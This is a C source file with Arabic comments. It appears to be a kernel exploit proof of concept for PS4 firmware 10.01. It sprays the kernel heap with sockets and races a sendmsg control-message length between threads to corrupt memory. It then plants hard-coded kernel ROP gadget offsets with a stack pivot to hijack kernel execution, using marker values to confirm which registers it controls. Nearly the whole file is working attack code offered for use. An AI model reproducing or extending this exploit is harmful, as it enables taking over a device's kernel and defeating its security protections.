#include <ps4.h>

// --- الإزاحات (Offsets) لنسخة 10.01 ---
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_JMP_RSI_3B           0x049C5D 
#define OFF_LEA_RSP_RSI_20_RET   0x72B346 
#define OFF_POP_RBX_R14_RBP_JMP  0x345741 

// --- الإعدادات والهياكل ---
#define CONTROL_LEN 256
#define SPRAY_COUNT 256

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;
int spray_socks[SPRAY_COUNT];

// --- 1. دالة تهيئة الذاكرة (لضمان استقرار الـ Heap) ---
void prepare_heap() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0); 
        if(spray_socks[i] > 0) {
            uint8_t dummy[0x50];
            memset(dummy, 0, 0x50);
            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0);
        }
    }
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) {
            syscall(6, spray_socks[i]); 
            spray_socks[i] = -1;
        }
    }
}

// --- 2. خيوط المعالجة للسباق (Race Condition Threads) ---
void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) {
        syscall(28, global_sock, &msg, 0);
    }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        cmsg->cmsg_len = 0x50;   
        cmsg->cmsg_len = 0xFFFF; 
    }
    return NULL;
}

// --- 3. الدالة الرئيسية ---
int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    
    // تعريف خطوات السلسلة
    uintptr_t step1 = (uintptr_t)(kbase + OFF_PUSH_RSP_POP_RSI_RET);
    uintptr_t step2 = (uintptr_t)(kbase + OFF_JMP_RSI_3B);
    uintptr_t step3 = (uintptr_t)(kbase + OFF_LEA_RSP_RSI_20_RET);
    uintptr_t step4 = (uintptr_t)(kbase + OFF_POP_RBX_R14_RBP_JMP);
    
    uintptr_t val_target = 0xDEADC0DE; // <<--- ستظهر في السجلات (Marker A)
    uintptr_t val_extra  = 0xBAADF00D; // <<--- ستظهر في السجلات (Marker B)

    prepare_heap();

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50;

    // !!! منطقة البحث العمياء (Blind Spraying) لـ ext_free !!!
    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
        *(uintptr_t *)(control_buf + i) = step1;
    }

    // !!! ضمان توجيه التنفيذ لـ RSI+3B بعد الـ Trigger !!!
    for (int i = 0x50; i < 0xA0; i += 8) {
        *(uintptr_t *)(control_buf + i) = step2;
    }

    // !!! الـ Stack Pivot: تحويل الـ RSI إلى مكدس (Marker C) !!!
    *(uintptr_t *)(control_buf + 0x3b) = step3; 

    // !!! المكدس الجديد (RSP الجديد): هنا يتم شحن السجلات (Marker D) !!!
    // المنطقة التي جعلت r12, r13, r14 تأخذ قيمك:
    *(uintptr_t *)(control_buf + 0x20) = step4;      // تنفيذ pop rbx; pop r14...
    *(uintptr_t *)(control_buf + 0x28) = val_target; // شحن السجل الأول
    *(uintptr_t *)(control_buf + 0x30) = val_extra;  // شحن السجل الثاني
    *(uintptr_t *)(control_buf + 0x38) = step3;      // صمام أمان السلسلة

    global_sock = syscall(97, 2, 2, 0);

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);

    return 0;
}
